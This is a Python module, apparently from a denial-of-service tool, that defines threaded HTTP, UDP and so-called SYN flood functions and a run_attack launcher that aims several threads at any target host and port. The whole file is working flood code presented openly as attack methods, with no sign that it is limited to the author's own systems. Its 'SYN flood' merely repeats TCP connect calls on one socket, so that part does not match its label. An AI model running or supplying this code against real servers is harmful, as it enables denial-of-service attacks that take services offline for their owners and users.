"""
Attack methods for HTTP, UDP, SYN flood, and mixed traffic.
"""

import requests
import socket
import threading
import random
import time

_running = True

def stop_attacks():
    global _running
    _running = False

def _http_flood(target, rps, duration, chart_callback=None):
    global _running
    end_time = time.time() + duration
    sent = 0
    while _running and time.time() < end_time:
        try:
            requests.get(target, timeout=1)
            sent += 1
            if chart_callback:
                chart_callback(sent)
        except Exception:
            pass
        time.sleep(1.0 / max(rps, 1))

def _udp_flood(target, port, rps, duration, chart_callback=None):
    global _running
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)
    end_time = time.time() + duration
    sent = 0
    while _running and time.time() < end_time:
        try:
            sock.sendto(data, (target, port))
            sent += 1
            if chart_callback:
                chart_callback(sent)
        except Exception:
            pass
        time.sleep(1.0 / max(rps, 1))

def _syn_flood(target, port, rps, duration, chart_callback=None):
    global _running
    sock = socket.socket()
    end_time = time.time() + duration
    sent = 0
    while _running and time.time() < end_time:
        try:
            sock.connect_ex((target, port))
            sent += 1
            if chart_callback:
                chart_callback(sent)
        except Exception:
            pass
        time.sleep(1.0 / max(rps, 1))

def run_attack(target, attack_type, rps, duration, num_nodes=1, chart_callback=None):
    global _running
    _running = True

    threads = []
    host, port = target.replace("http://", "").replace("https://", ""), 80
    if ":" in host:
        host, port = host.split(":")
        port = int(port)

    for _ in range(num_nodes):
        if attack_type == "http":
            t = threading.Thread(target=_http_flood, args=(target, rps, duration, chart_callback))
        elif attack_type == "udp":
            t = threading.Thread(target=_udp_flood, args=(host, port, rps, duration, chart_callback))
        elif attack_type == "syn":
            t = threading.Thread(target=_syn_flood, args=(host, port, rps, duration, chart_callback))
        else:  # mixed
            if random.choice([True, False]):
                t = threading.Thread(target=_http_flood, args=(target, rps, duration, chart_callback))
            else:
                t = threading.Thread(target=_udp_flood, args=(host, port, rps, duration, chart_callback))
        t.daemon = True
        threads.append(t)
        t.start()

    for t in threads:
        t.join()
